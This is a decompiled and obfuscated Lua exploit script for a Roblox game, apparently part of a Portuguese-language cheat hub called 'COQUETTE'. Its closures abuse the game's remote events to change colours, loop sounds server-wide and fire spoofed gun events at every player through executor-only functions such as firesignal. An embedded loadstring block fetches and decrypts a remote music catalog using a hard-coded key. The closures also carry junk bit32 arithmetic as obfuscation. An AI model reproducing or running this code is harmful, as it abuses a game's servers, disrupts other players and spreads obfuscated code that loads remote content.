		local clickPath = v.ClickPath or v.DynamicClickPath and v.DynamicClickPath()
		local v3 = upv5(clickPath)
		local clickDelay = v.ClickDelay or 0.08

		while true do
			v3 = v3 or upv5(clickPath)
			upv4(v3)
			if clickDelay > 0 then
				task.wait(clickDelay)
				continue
			end
			upv7.Heartbeat:Wait()
		end
	end)
end

-- payload closure created 524-th (proto #359)
local function payload_fn_524()
	upv1.Velocity = Vector3.zero
	upv1.RotVelocity = Vector3.zero
	task.wait(0.1)
	upv1.CFrame = posOriginal
	upv1.Velocity = Vector3.zero
end

-- payload closure created 525-th (proto #370)
local function payload_fn_525()
	local speed = upv1.Speed
	return Color3.fromHSV(tick() * speed % 5 / 5, 1, 1)
end

-- payload closure created 526-th (proto #t8370)
local function payload_fn_526(arg, arg2, arg3, arg4, arg5)
	return arg3 + (math.sin(arg * arg2 + (arg5 or 0)) * 0.5 + 0.5) * (arg4 - arg3)
end

-- payload closure created 527-th (proto #t8600)
local function payload_fn_527(arg, arg2, arg3)
	return Color3.new(arg.R + (arg2.R - arg.R) * arg3, arg.G + (arg2.G - arg.G) * arg3, arg.B + (arg2.B - arg.B) * arg3)
end

-- payload closure created 528-th (proto #t7221)
local function payload_fn_528(arg)
	local v, v2, v3 = upv1.CustomColor:ToHSV()
	return Color3.fromHSV(v, v2, math.clamp(v3 * upv2(arg, upv1.Speed, 0.35, 1), 0.05, 1))
end

-- payload closure created 529-th (proto #t1171)
local function payload_fn_529(arg)
	local v, v2, v3 = upv1.CustomColor:ToHSV()
	return Color3.fromHSV((v + (math.sin(arg * upv1.Speed * 0.5) * 0.5 + 0.5) * 0.35) % 1, v2, v3)
end

-- payload closure created 530-th (proto #t9445)
local function payload_fn_530(arg)
	local v, v2 = upv1.CustomColor:ToHSV()
	local n2 = math.sin(arg * upv1.Speed) * 0.5 + 0.5
	local n3 = math.clamp(v2 * (0.7 + n2 * 0.3), 0, 1)
	local n4 = math.clamp(0.75 + n2 * 0.25, 0, 1)
	return Color3.fromHSV((v + n2 * 0.15) % 1, n3, n4)
end

-- payload closure created 531-th (proto #t5965)
local function payload_fn_531(arg)
	local v = upv1.CustomColor:ToHSV()
	local n2 = math.sin(arg * upv1.Speed) * 0.5 + 0.5
	local n3 = math.clamp(0.65 + n2 * 0.35, 0, 1)
	local n4 = math.clamp(0.7 + n2 * 0.3, 0, 1)
	return Color3.fromHSV(v, n3, n4)
end

-- payload closure created 532-th (proto #t8803)
local function payload_fn_532(arg)
	local n2 = math.sin(arg * upv1.Speed) * 0.5 + 0.5
	return upv2(upv1.CustomColor, Color3.fromRGB(255, 215, 130), n2 * 0.6)
end

-- payload closure created 533-th (proto #t3405)
local function payload_fn_533(arg)
	local n2 = math.sin(arg * upv1.Speed) * 0.5 + 0.5
	local v = upv2(upv1.CustomColor, Color3.fromRGB(35, 20, 60), n2 * 0.7)
	local n3 = 0.85 + n2 * 0.15
	local clamp = math.clamp
	local n4 = v.B * n3
	return Color3.new(math.clamp(v.R * n3, 0, 1), math.clamp(v.G * n3, 0, 1), clamp(n4, 0, 1))
end

-- payload closure created 534-th (proto #t5631)
local function payload_fn_534(arg)
	local v, v2 = upv1.CustomColor:ToHSV()
	local n2 = math.sin(arg * upv1.Speed) * 0.5 + 0.5
	local n3 = math.clamp(v2 * (1 - n2 * 0.25), 0.1, 1)
	local n4 = math.clamp(0.8 + n2 * 0.2, 0, 1)
	return Color3.fromHSV((v + ((v * 0.5 + 0.55) % 1 - v) * n2 * 0.4) % 1, n3, n4)
end

-- payload closure created 535-th (proto #t325)
local function payload_fn_535()
	return upv1.CustomColor
end

-- payload closure created 536-th (proto #369)
local function payload_fn_536()
	if upv1.Mode == "Cor personalizada" then
		local v = upv2[upv1.Gradient]

		if v then
			local ok2, result2 = pcall(v, tick())
			if ok2 and typeof(result2) == "Color3" then
				return result2
			end
		end

		return upv1.CustomColor
	end

	return upv3()
end

-- payload closure created 537-th (proto #366)
local function payload_fn_537(arg, arg2, arg3)
	local flag = type(0) == "thread"
	local n2 = 8755432029
	upv1.States[arg] = true

	task.spawn(function()
		while upv1.States[arg] do
			if not upv2 or not upv2.Parent then
				upv1.States[arg] = false
				break
			else
				pcall(arg3)
				task.wait(arg2)
			end
		end
	end)
end

-- payload closure created 538-th (proto #371)
local function payload_fn_538(arg)
	upv1.States[arg] = false
end

-- payload closure created 539-th (proto #364)
local function payload_fn_539(arg, arg2, arg3, arg4, arg5, arg6, arg7)
	local n2 = 76982349

	if arg4 ~= 216425867 then
	end

	local n3 = bit32.bxor(n2, 498314740) + 3070950169
	local v = table.pack(bit32.band(n2, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local v3 = bit32.band(64281 * v2[1] + bit32.lshift(bit32.band(64281 * bit32.rshift(v[1], 16) + 46858 * v2[1], 65535), 16), 4294967295)
	local v4 = table.pack(bit32.band(bit32.bnot(n2), 4294967295))
	local v5 = table.pack(bit32.band(v4[1], 65535))
	local n4 = n3 + v3 + bit32.band(64281 * v5[1] + bit32.lshift(bit32.band(64281 * bit32.rshift(v4[1], 16) + 46858 * v5[1], 65535), 16), 4294967295)

	upv1:AddToggle({
		Name = arg,
		Description = arg3,
		Default = false,
		Callback = function(arg8)
			if arg8 then
				upv2(arg5, arg6, arg7)
			else
				upv3(arg5)
			end
		end,
	})
end

-- payload closure created 540-th (proto #360)
local function payload_fn_540(speed)
	upv1.Speed = speed
end

-- payload closure created 541-th (proto #361)
local function payload_fn_541(mode)
	if mode == "RGB" or mode == "Cor personalizada" then
		upv1.Mode = mode
	end
end

-- payload closure created 542-th (proto #362)
local function payload_fn_542(gradient)
	upv1.Gradient = gradient
end

-- payload closure created 543-th (proto #363)
local function payload_fn_543(customColor)
	if typeof(customColor) == "Color3" then
		upv1.CustomColor = customColor
	end
end

-- payload closure created 544-th (proto #368)
local function payload_fn_544()
	local v = upv1()
	upv2.RE["1RPNam1eColo1r"]:FireServer("PickingRPNameColor", v)
end

-- payload closure created 547-th (proto #372)
local function payload_fn_547()
	local v = upv1()
	upv2.RE["1RPNam1eColo1r"]:FireServer("PickingRPBioColor", v)
end

-- payload closure created 548-th (proto #373)
local function payload_fn_548()
	local v = upv1()
	upv2.Remotes.ChangeBodyColor:FireServer(BrickColor.new(v).Name)
end

-- payload closure created 549-th (proto #374)
local function payload_fn_549()
	upv1.RE["1Max1y"]:FireServer("ChangeHairColor2", upv2())
end

-- payload closure created 550-th (proto #375)
local function payload_fn_550()
	upv1.RE["1Player1sHous1e"]:FireServer("ColorPickHouse", upv2())
end

-- payload closure created 551-th (proto #376)
local function payload_fn_551()
	local v = upv1()
	local playerGui = upv2:FindFirstChild("PlayerGui")

	if playerGui then
		local setColor = playerGui:FindFirstChild("MainGUIHandler") and playerGui.MainGUIHandler:FindFirstChild("VehicleControl") and playerGui.MainGUIHandler.VehicleControl:FindFirstChild("UIColorPicker") and playerGui.MainGUIHandler.VehicleControl.UIColorPicker:FindFirstChild("SetColor")
		if setColor then
			setColor:FireServer(v)
			return
		end
	end

	upv3.RE["1Player1sCa1r"]:FireServer("PickingCarColor", v)
end

-- payload closure created 552-th (proto #377)
local function payload_fn_552()
	upv1.RE["1Player1sCa1r"]:FireServer("NoMotorColor", upv2())
end

-- payload closure created 553-th (proto #378)
local function payload_fn_553()
	upv1.PlayerGui.ToolGui.ToolSettings.Settings.PropsColor.SetColor:FireServer(upv2())
end

-- payload closure created 554-th (proto #t9114)
local function payload_fn_554(arg, arg2)
	local volume = arg2 or 1
	local character = upv1.Character

	if character and character:FindFirstChild("HumanoidRootPart") then
		local humanoidRootPart = character.HumanoidRootPart
		local n2 = 9089812132

		task.spawn(function()
			local flag = bit32.bxor(bit32.bxor(n2, 0), 79669319) ~= 427044579
			local sound = Instance.new("Sound")
			sound.SoundId = "rbxassetid://" .. tostring(arg)
			sound.Volume = volume
			sound.Looped = false
			sound.Parent = humanoidRootPart
			local n3 = 208049244
			sound:Play()

			sound.Ended:Connect(function()
				sound:Destroy()
			end)

			task.delay(3, function()
				if sound then
					sound:Destroy()
				end
			end)
		end)
	end
end

-- payload closure created 555-th (proto #t3342)
local function payload_fn_555(arg)
	local str = tostring(arg)
	local n1Gu1nSound1s = upv1:FindFirstChild("1Gu1nSound1s", true)

	if n1Gu1nSound1s then
		local n2 = 9054910128

		pcall(function()
			n1Gu1nSound1s:FireServer(workspace, str, 1)
		end)
	end

	task.wait(0.3)
	local n1Gu1n = upv1.RE and upv1.RE:FindFirstChild("1Gu1n")

	if upv2 then
		upv3(str)
	end

	if not n1Gu1n then
		return
	end

	for _, player in pairs(upv4:GetPlayers()) do
		local character = player.Character

		if character and character:FindFirstChild("HumanoidRootPart") then
			local humanoidRootPart = character.HumanoidRootPart
			local n2 = 317082703

			task.spawn(function()
				local n3 = 8938850043

				pcall(function()
					local v = bit32.bxor(n3, 1535740645)
					local v2 = firesignal
					local onClientEvent = n1Gu1n.OnClientEvent
					local unpack_ = table.unpack
					local tbl = { player, humanoidRootPart, humanoidRootPart, Vector3.new(0, -1, 0), Vector3.zero, humanoidRootPart, humanoidRootPart, str, str, { true } }

					local tbl2 = {
						25,
						Vector3.new(0.25, 0.25, 100),
						BrickColor.new("Bright yellow"),
						0.25,
						Enum.Material.SmoothPlastic,
						0.25,
					}

					tbl[11] = tbl2
					tbl[12] = true
					tbl[13] = false
					v2(onClientEvent, unpack_(tbl))
				end)
			end)

			task.spawn(function()
				local n3 = 13091466997

				pcall(function()

					n1Gu1n:FireServer(table.unpack({
						humanoidRootPart,
						humanoidRootPart,
						Vector3.new(0, -1, 0),
						Vector3.zero,
						humanoidRootPart,
						humanoidRootPart,
						str,
						str,
						{ true },
						{
							25,
							Vector3.new(0.25, 0.25, 100),
							BrickColor.new("Bright yellow"),
							0.25,
							Enum.Material.SmoothPlastic,
							0.25,
						},
						true,
						false,
					}))
				end)
			end)

			task.wait(0.05)
		end
	end
end

-- payload closure created 556-th (proto #t3906)
local function payload_fn_556(arg)
	local str = tostring(arg)
	local flag = true
	local n1Gu1nSound1s = upv1:FindFirstChild("1Gu1nSound1s", true)

	if n1Gu1nSound1s then
		local n2 = 8812437057

		pcall(function()
			n1Gu1nSound1s:FireServer(workspace, str, 1)
		end)
	end

	task.wait(0.3)
	local n1Gu1n = upv1.RE and upv1.RE:FindFirstChild("1Gu1n")

	if upv2 then
		upv3(str)
	end

	if not n1Gu1n then
		return
	end
	local character = upv4.Character

	if character and character:FindFirstChild("HumanoidRootPart") then
		local humanoidRootPart = character.HumanoidRootPart
		local n2 = 373624663

		task.spawn(function()
			local n3 = 4613715070

			pcall(function()
				local v = bit32.bxor(n3, 931001535)
				local v2 = firesignal
				local onClientEvent = n1Gu1n.OnClientEvent
				local unpack_ = table.unpack
				local tbl = { upv4, humanoidRootPart, humanoidRootPart, Vector3.new(0, -1, 0), Vector3.zero, humanoidRootPart }
				local v3 = bit32.bxor(1212658472, v)
				tbl[7] = humanoidRootPart
				tbl[8] = str
				tbl[9] = str
				tbl[10] = { true }

				tbl[11] = {
					25,
					Vector3.new(0.25, 0.25, 100),
					BrickColor.new("Bright yellow"),
					0.25,
					Enum.Material.SmoothPlastic,
					0.25,
				}

				tbl[12] = true
				tbl[13] = false
				v2(onClientEvent, unpack_(tbl))
			end)
		end)

		task.spawn(function()
			local n3 = 8601154222

			pcall(function()

				n1Gu1n:FireServer(table.unpack({
					humanoidRootPart,
					humanoidRootPart,
					Vector3.new(0, -1, 0),
					Vector3.zero,
					humanoidRootPart,
					humanoidRootPart,
					str,
					str,
					{ true },
					{
						25,
						Vector3.new(0.25, 0.25, 100),
						BrickColor.new("Bright yellow"),
						0.25,
						Enum.Material.SmoothPlastic,
						0.25,
					},
					true,
					false,
				}))
			end)
		end)
	end
end

-- payload closure created 557-th (proto #379)
local function payload_fn_557(arg)
	local num = tonumber(arg)

	if num then
		upv1 = num
	else
		upv1 = nil
	end
end

-- payload closure created 558-th (proto #380)
local function payload_fn_558(arg)
	upv1 = arg
end

-- payload closure created 559-th (proto #381)
local function payload_fn_559()
	if upv1 then
		upv2(upv1)
	else
		warn("[COQUETTE] Nenhum ID válido inserido!")
	end
end

-- payload closure created 560-th (proto #382)
local function payload_fn_560()
	if upv1 then
		upv2(upv1)
	else
		warn("[COQUETTE] Nenhum ID válido inserido!")
	end
end

-- payload closure created 561-th (proto #383)
local function payload_fn_561(arg)
	upv1 = arg
end

-- payload closure created 562-th (proto #384)
local function payload_fn_562(arg)
	upv1 = arg

	if upv1 then
		local n2 = 786454680

		task.spawn(function()
			while upv1 do
				if upv2 then
					upv3(upv2)
				end

				task.wait(upv4)
			end
		end)
	end
end

-- payload closure created 564-th (proto #386)
local function payload_fn_564(arg)
	upv1 = arg

	if upv1 then
		local n2 = 8832466480

		task.spawn(function()
			while upv1 do
				if upv2 then
					upv3(upv2)
				end

				task.wait(upv4)
			end
		end)
	end
end

-- payload closure created 566-th (proto #388)
local function payload_fn_566(arg, arg2, arg3, arg4, arg5)
	local n2 = 431835228

	if arg ~= 226178063 then
	end

	local tbl = {}
	local tbl2 = {}
	local v = pairs
	local v2 = bit32.bxor(n2, 392683282)
	local v3, v4, v5 = v(arg4)
	local v6 = table.pack(bit32.band(v2, 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local n3 = bit32.band(65535 * v7[1] + bit32.lshift(bit32.band(65535 * bit32.rshift(v6[1], 16) + 65535 * v7[1], 65535), 16), 4294967295) + 2415794816
	local v8 = table.pack(bit32.band(bit32.bor(29167661, v2), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n4 = n3 + bit32.band(2 * v9[1] + bit32.lshift(bit32.band(2 * bit32.rshift(v8[1], 16) + 0 * v9[1], 65535), 16), 4294967295) + 1850004819

	for _, v10 in v3, v4, v5 do
		for _, v11 in ipairs(v10) do
			if v11.name and v11.name ~= "" and v11.id and v11.id ~= "" then
				table.insert(tbl, v11.name)
				tbl2[v11.name] = v11.id
			end
		end
	end

	upv1:AddDropdown({
		Name = arg2,
		Description = "Escolha um som para tocar no servidor",
		Default = arg5,
		Multi = false,
		Options = tbl,
		Callback = function(arg6)
			if arg6 and tbl2[arg6] then
				upv2 = tbl2[arg6]
			else
				upv2 = nil
			end
		end,
	})
end

-- payload closure created 568-th (proto #390)
local function payload_fn_568(arg)
	upv1 = arg
end

-- payload closure created 569-th (proto #391)
local function payload_fn_569()
	if upv1 then
		upv2(upv1)
	else
		warn("[COQUETTE] Nenhum som selecionado no dropdown!")
	end
end

-- payload closure created 570-th (proto #392)
local function payload_fn_570()
	if upv1 then
		upv2(upv1)
	else
		warn("[COQUETTE] Nenhum som selecionado no dropdown!")
	end
end

-- payload closure created 571-th (proto #393)
local function payload_fn_571(arg)
	upv1 = arg
end

-- payload closure created 572-th (proto #394)
local function payload_fn_572(arg)
	upv1 = arg

	if upv1 then
		local n2 = 526912030

		task.spawn(function()
			while upv1 do
				if upv2 then
					upv3(upv2)
				end

				task.wait(upv4)
			end
		end)
	end
end

-- payload closure created 574-th (proto #396)
local function payload_fn_574(arg)
	upv1 = arg

	if upv1 then
		local flag = type(0) == "buffer"
		local n2 = 349928120

		task.spawn(function()
			while upv1 do
				if upv2 then
					upv3(upv2)
				end

				task.wait(upv4)
			end
		end)
	end
end

-- payload closure created 576-th (proto #398)
local function payload_fn_576()
	local chunk, v = loadstring([[local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local API_URL = _G.CoquetteMusicApiUrl or "https://music.coquette-hub.com/api/catalog"
local CATALOG_KEY = "k-4pYg7GcMsPL2Sc-ypfB3E7SbWSg3ugPD7CrJTvzNU"
local FAVORITES_FILE = "CoquetteHub_Favorites.json"
local CONFIG_FILE = "CoquetteHub_MusicConfig.json"

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local oldGui = playerGui:FindFirstChild("CoquetteMusicPlayer")
if oldGui then
    oldGui:Destroy()
end

local viewport = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1366, 768)
local isCompactScreen = UserInputService.TouchEnabled or viewport.X <= 760 or viewport.Y <= 520

-- Paleta monocromatica: preto profundo com branco. Sem matiz colorida em nada
-- estrutural, so um vermelho bem apagado no hover do botao destrutivo.
local THEME = {
    backdrop = Color3.fromRGB(4, 4, 5),
    backdropLow = Color3.fromRGB(9, 9, 10),
    surface = Color3.fromRGB(14, 14, 16),
    surfaceHi = Color3.fromRGB(22, 22, 25),
    surfaceTop = Color3.fromRGB(33, 33, 37),
    line = Color3.fromRGB(46, 46, 51),
    accent = Color3.fromRGB(255, 255, 255),
    accentSoft = Color3.fromRGB(196, 198, 205),
    accentDeep = Color3.fromRGB(240, 241, 245),
    onAccent = Color3.fromRGB(8, 8, 10),
    text = Color3.fromRGB(244, 245, 249),
    textDim = Color3.fromRGB(120, 122, 131),
    textMute = Color3.fromRGB(88, 90, 98),
    good = Color3.fromRGB(238, 240, 246),
    warn = Color3.fromRGB(160, 162, 172),
    green = Color3.fromRGB(22, 22, 26),
    greenHi = Color3.fromRGB(36, 36, 42),
    red = Color3.fromRGB(22, 22, 26),
    redHi = Color3.fromRGB(56, 26, 30),
}

-- Layout base fixo. Nada de esticar a janela ate ocupar a tela toda no celular:
-- desenhamos sempre no mesmo tamanho logico e reduzimos via UIScale quando precisa.
local UI_WIDTH = 330
local UI_HEIGHT = isCompactScreen and 510 or math.clamp(math.floor(viewport.Y * 0.72), 470, 520)

-- Fator de escala: a janela nunca passa de 42% da largura nem 78% da altura da tela.
local UI_SCALE = 1
if isCompactScreen then
    UI_SCALE = math.clamp(math.min((viewport.X * 0.42) / UI_WIDTH, (viewport.Y * 0.78) / UI_HEIGHT), 0.62, 1)
end

local HEADER_HEIGHT = 52
local BODY_PAD = 12
local NOW_Y, NOW_HEIGHT = 0, 50
local NOW_CAPTION_Y = 8
local NOW_NAME_Y = 24
local STATUS_Y = 56
local FIELD_HEIGHT = 36
local CUSTOM_ID_Y = 76
local CATEGORY_Y = 158
local SEARCH_Y = 200
local LIST_Y = 242

-- Visualizador de audio
local EQ_BAR_COUNT = 5
local EQ_BAR_WIDTH = 3
local EQ_BAR_GAP = 2
local EQ_WIDTH = EQ_BAR_COUNT * EQ_BAR_WIDTH + (EQ_BAR_COUNT - 1) * EQ_BAR_GAP
local EQ_HEIGHT = 14
local EQ_MIN_BAR = 2

local CONTROL_BUTTON_HEIGHT = isCompactScreen and 38 or 36
local CONTROL_HEIGHT = isCompactScreen and (CONTROL_BUTTON_HEIGHT * 2 + 8) or CONTROL_BUTTON_HEIGHT
local LIST_HEIGHT = math.max(20, UI_HEIGHT - HEADER_HEIGHT - BODY_PAD * 2 - LIST_Y - 8 - CONTROL_HEIGHT)
local CONTROLS_Y = LIST_Y + LIST_HEIGHT + 8
local ROW_HEIGHT = isCompactScreen and 38 or 36
local CATEGORY_ROW_HEIGHT = isCompactScreen and 34 or 30
local DROPDOWN_MAX_HEIGHT = 200
local MINI_WIDTH = 220
local MINI_HEIGHT = 68
local ICON_CHEVRON_DOWN = "rbxassetid://10709796864"
local ICON_CHEVRON_UP = "rbxassetid://10709791523"
local ICON_CHEVRON_RIGHT = "rbxassetid://10709791347"

local categories = {}
local favorites = {}
local savedConfig = {}
local currentCategory = ""
local currentSearch = ""
local filtered = {}
local selectedMusic = nil
local selectedIndex = 0
local minimized = false

local function trim(value)
    return tostring(value or ""):match("^%s*(.-)%s*$")
end

local function safeTween(object, goal, time)
    TweenService:Create(object, TweenInfo.new(time or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), goal):Play()
end

local function makeSeed(key)
    local seed = 91
    for i = 1, #key do
        seed = (seed + string.byte(key, i) * (((i - 1) % 17) + 1)) % 256
    end
    return seed
end

local base64Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local base64Lookup = {}
for i = 1, #base64Alphabet do
    base64Lookup[base64Alphabet:sub(i, i)] = i - 1
end

local function base64Decode(data)
    data = tostring(data or ""):gsub("%s", "")
    local bytes = {}
    local index = 1
    for i = 1, #data, 4 do
        local a = base64Lookup[data:sub(i, i)] or 0
        local b = base64Lookup[data:sub(i + 1, i + 1)] or 0
        local cChar = data:sub(i + 2, i + 2)
        local dChar = data:sub(i + 3, i + 3)
        local c = base64Lookup[cChar] or 0
        local d = base64Lookup[dChar] or 0
        local n = a * 262144 + b * 4096 + c * 64 + d
        bytes[index] = string.char(math.floor(n / 65536) % 256)
        index = index + 1
        if cChar ~= "=" and cChar ~= "" then
            bytes[index] = string.char(math.floor(n / 256) % 256)
            index = index + 1
        end
        if dChar ~= "=" and dChar ~= "" then
            bytes[index] = string.char(n % 256)
            index = index + 1
        end
    end
    return table.concat(bytes)
end

local function decryptPayload(payload)
    local encrypted = base64Decode(payload)
    local seed = makeSeed(CATALOG_KEY)
    local out = table.create and table.create(#encrypted) or {}
    for i = 1, #encrypted do
        seed = (seed * 73 + 41 + (i % 251)) % 256
        out[i] = string.char(bit32.bxor(string.byte(encrypted, i), seed))
    end
    return table.concat(out)
end

local function httpGet(url)
    local ok, result = pcall(function()
        return game:HttpGet(url, true)
    end)
    if ok and result and result ~= "" then
        return result
    end
    ok, result = pcall(function()
        return HttpService:GetAsync(url)
    end)
    if ok and result and result ~= "" then
        return result
    end
    return nil
end

local function loadRemoteCatalog()
    local raw = httpGet(API_URL)
    if not raw then
        return false, "Nao foi possivel puxar o catalogo"
    end
    local okResponse, response = pcall(function()
        return HttpService:JSONDecode(raw)
    end)
    if not okResponse or type(response) ~= "table" or not response.payload then
        return false, "Resposta do site invalida"
    end
    local okCatalog, catalog = pcall(function()
        return HttpService:JSONDecode(decryptPayload(response.payload))
    end)
    if not okCatalog or type(catalog) ~= "table" or type(catalog.categories) ~= "table" then
        return false, "Falha ao descriptografar catalogo"
    end
    categories = catalog.categories
    return true, "Catalogo carregado"
end

local function cleanMusicId(str)
    str = tostring(str or ""):gsub("%s+", "")
    local num = str:match("(%d+)")
    return num or str
end

local function safeReadFile(path)
    if type(readfile) == "function" then
        local ok, content = pcall(readfile, path)
        if ok and type(content) == "string" and content ~= "" then
            return content
        end
    end
    return nil
end

local function safeWriteFile(path, content)
    if type(writefile) == "function" then
        return pcall(writefile, path, content)
    end
    return false
end

local function loadFavorites()
    favorites = {}
    local seen = {}
    local raw = safeReadFile(FAVORITES_FILE)
    if raw then
        local ok, data = pcall(function()
            return HttpService:JSONDecode(raw)
        end)
        if ok and type(data) == "table" then
            for _, item in ipairs(data) do
                if type(item) == "table" and item.id and tostring(item.id) ~= "" then
                    local id = cleanMusicId(item.id)
                    local name = trim(item.name)
                    if name == "" then
                        name = "ID: " .. id
                    end
                    if id ~= "" and not seen[id] then
                        seen[id] = true
                        table.insert(favorites, {
                            name = name,
                            id = id,
                            category = tostring(item.category or "Favoritas")
                        })
                    end
                end
            end
        end
    end
end

local function loadConfig()
    savedConfig = {}
    local raw = safeReadFile(CONFIG_FILE)
    if raw then
        local ok, data = pcall(function()
            return HttpService:JSONDecode(raw)
        end)
        if ok and type(data) == "table" then
            savedConfig = data
        end
    end
end

local function saveConfig()
    savedConfig.lastCategory = currentCategory
    savedConfig.width = UI_WIDTH
    savedConfig.height = UI_HEIGHT
    local ok, json = pcall(function()
        return HttpService:JSONEncode(savedConfig)
    end)
    if ok and json then
        safeWriteFile(CONFIG_FILE, json)
    end
end

local function categoryExists(name)
    if name == "Favoritas" then
        return true
    end
    for _, category in ipairs(categories) do
        if category.name == name then
            return true
        end
    end
    return false
end

local function chooseInitialCategory()
    local lastCategory = tostring(savedConfig.lastCategory or "")
    if lastCategory ~= "" and categoryExists(lastCategory) then
        currentCategory = lastCategory
    elseif categories[1] and categories[1].name then
        currentCategory = categories[1].name
    else
        currentCategory = "Favoritas"
    end
end

local function saveFavorites()
    local ok, json = pcall(function()
        return HttpService:JSONEncode(favorites)
    end)
    if ok and json then
        safeWriteFile(FAVORITES_FILE, json)
    end
end

local function isFavorite(id)
    id = cleanMusicId(id)
    for _, fav in ipairs(favorites) do
        if cleanMusicId(fav.id) == id then
            return true
        end
    end
    return false
end

local function addOrUpdateFavorite(music)
    if not music or not music.id or tostring(music.id) == "" then return false, "invalido" end
    local id = cleanMusicId(music.id)
    if id == "" then return false, "invalido" end
    local name = trim(music.name)
    if name == "" then
        name = "ID: " .. id
    end
    local category = tostring(music.category or "Favoritas")
    for _, fav in ipairs(favorites) do
        if cleanMusicId(fav.id) == id then
            fav.name = name
            if category ~= "" then
                fav.category = category
            end
            saveFavorites()
            return true, "atualizado"
        end
    end
    table.insert(favorites, { name = name, id = id, category = category })
    saveFavorites()
    return true, "novo"
end

local function addFavorite(music)
    addOrUpdateFavorite(music)
end

local function removeFavorite(id)
    id = cleanMusicId(id)
    for i, fav in ipairs(favorites) do
        if cleanMusicId(fav.id) == id then
            table.remove(favorites, i)
            saveFavorites()
            return
        end
    end
end

local function tocarMusica(id)
    id = tostring(id or "")
    local re = ReplicatedStorage:WaitForChild("RE")
    pcall(function() re:WaitForChild("PlayerToolEvent"):FireServer("ToolMusicText", id) end)
    pcall(function() re:WaitForChild("1Player1sHous1e"):FireServer("PickHouseMusicText", id) end)
    pcall(function() re:WaitForChild("1Player1sCa1r"):FireServer("VehicleMusicPlay", id) end)
    pcall(function() re:WaitForChild("1NoMoto1rVehicle1s"):FireServer("PickingScooterMusicText", id) end)
end

local gui = Instance.new("ScreenGui")
gui.Name = "CoquetteMusicPlayer"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = playerGui

local main = Instance.new("Frame")
main.Size = UDim2.new(0, UI_WIDTH, 0, UI_HEIGHT)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.Position = UDim2.new(0.5, 0, 0.5, 0)
-- Branco de proposito: o UIGradient abaixo multiplica esta cor, entao ele e quem define o tom
main.BackgroundColor3 = Color3.new(1, 1, 1)
main.BorderSizePixel = 0
main.ClipsDescendants = true
main.Parent = gui

-- Reduz a janela inteira em telas pequenas mantendo as proporcoes do desenho
local mainScale = Instance.new("UIScale")
mainScale.Scale = UI_SCALE
mainScale.Parent = main

do
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 18)
    mainCorner.Parent = main

    local mainGradient = Instance.new("UIGradient")
    mainGradient.Rotation = 90
    mainGradient.Color = ColorSequence.new(THEME.backdropLow, THEME.backdrop)
    mainGradient.Parent = main

    local mainStroke = Instance.new("UIStroke")
    mainStroke.Color = Color3.new(1, 1, 1)
    mainStroke.Thickness = 1.2
    mainStroke.Transparency = 0.35
    mainStroke.Parent = main

    local strokeGradient = Instance.new("UIGradient")
    strokeGradient.Rotation = 90
    strokeGradient.Color = ColorSequence.new(Color3.fromRGB(92, 94, 102), Color3.fromRGB(26, 26, 30))
    strokeGradient.Parent = mainStroke
end

-- Puxador visual para redimensionar a janela no canto inferior direito
local resizeGrip = Instance.new("Frame")
resizeGrip.Name = "ResizeGrip"
resizeGrip.Size = UDim2.new(0, 18, 0, 18)
resizeGrip.Position = UDim2.new(1, -2, 1, -2)
resizeGrip.AnchorPoint = Vector2.new(1, 1)
resizeGrip.BackgroundTransparency = 1
resizeGrip.ZIndex = 25
resizeGrip.Active = true
resizeGrip.Parent = main

do
    for i = 1, 3 do
        local line = Instance.new("Frame")
        line.Size = UDim2.new(0, i * 4 + 2, 0, 2)
        line.Position = UDim2.new(1, -2, 1, -((3 - i) * 4 + 2))
        line.AnchorPoint = Vector2.new(1, 1)
        line.BackgroundColor3 = THEME.textMute
        line.BorderSizePixel = 0
        line.ZIndex = 26
        line.Parent = resizeGrip
        local lCorner = Instance.new("UICorner")
        lCorner.CornerRadius = UDim.new(1, 0)
        lCorner.Parent = line
    end
end

local list, controls = nil, nil

local MIN_WIDTH = 280
local MAX_WIDTH = math.max(330, math.floor((viewport.X * 0.9)))
local MIN_HEIGHT = 380
local MAX_HEIGHT = math.max(510, math.floor((viewport.Y * 0.9)))

local function getDropdownMaxHeight()
    local dropTopInBody = CATEGORY_Y + FIELD_HEIGHT + 4
    local availableInBody = UI_HEIGHT - HEADER_HEIGHT - BODY_PAD - dropTopInBody - 4
    return math.max(60, math.floor(availableInBody))
end

local function applyWindowSize(w, h)
    UI_WIDTH = math.clamp(math.floor(w), MIN_WIDTH, MAX_WIDTH)
    UI_HEIGHT = math.clamp(math.floor(h), MIN_HEIGHT, MAX_HEIGHT)
    if main then
        main.Size = UDim2.new(0, UI_WIDTH, 0, UI_HEIGHT)
    end

    local listHeight = math.max(20, UI_HEIGHT - HEADER_HEIGHT - BODY_PAD * 2 - LIST_Y - 8 - CONTROL_HEIGHT)
    if list then
        list.Size = UDim2.new(1, 0, 0, listHeight)
    end
    if controls then
        controls.Position = UDim2.new(0, 0, 1, -CONTROL_HEIGHT)
    end
    DROPDOWN_MAX_HEIGHT = getDropdownMaxHeight()
    if dropdown and dropdown.Visible then
        local contentH = dropLayout.AbsoluteContentSize.Y + 16
        if contentH <= 16 then
            contentH = (#categories + 1) * (CATEGORY_ROW_HEIGHT + 4) + 16
        end
        dropdown.Size = UDim2.new(1, 0, 0, math.min(contentH, DROPDOWN_MAX_HEIGHT))
    end
end

local header = Instance.new("Frame")
header.Size = UDim2.new(1, -8, 0, 48)
header.Position = UDim2.new(0, 4, 0, 4)
header.BackgroundColor3 = Color3.new(1, 1, 1)
header.BorderSizePixel = 0
header.ClipsDescendants = true
header.Parent = main
do
    local headerCorner = Instance.new("UICorner")
    headerCorner.CornerRadius = UDim.new(0, 15)
